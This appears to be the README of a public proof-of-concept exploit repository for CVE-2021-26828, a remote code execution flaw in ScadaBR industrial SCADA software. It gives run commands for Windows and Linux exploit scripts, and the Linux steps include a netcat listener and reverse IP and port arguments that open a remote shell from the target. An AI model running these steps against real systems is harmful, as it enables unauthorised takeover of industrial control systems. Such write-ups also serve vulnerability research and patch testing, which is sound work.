# POC CVE-2021-26828_ScadaBR_RemoteCodeExecution

- ScadaBR 0.9.1 on Linux and through 1.0 and 1.12.4CE on Windows allows remote authenticated users to upload and execute arbitrary JSP files via 'view_edit.shtm' and Remote Code Execution.

### Exploit Usage

#### Commands:
- Windows:
`$ sudo python WinScada_RCE.py <Remote_Host> <Remote_Port> <User> <Pass>`

![](https://github.com/hevox/CVE-2021-26828_ScadaBR_RCE/blob/main/PocScadaBRWin.png)

- Linux:
First in your local machine open any port before exploit execution:

`$ sudo nc -vnlp 4444`

`$ sudo python LinScada_RCE.py <Remote_Host> <Remote_Port> <User> <Pass> <Reverse_IP> <Reverse_Port>`

![](https://github.com/hevox/CVE-2021-26828_ScadaBR_RCE/blob/main/PocScadaBRLin.png)

- References:

  https://www.exploit-db.com/exploits/49734

  https://www.exploit-db.com/exploits/49735

  https://www.youtube.com/watch?v=k1teIStQr1A
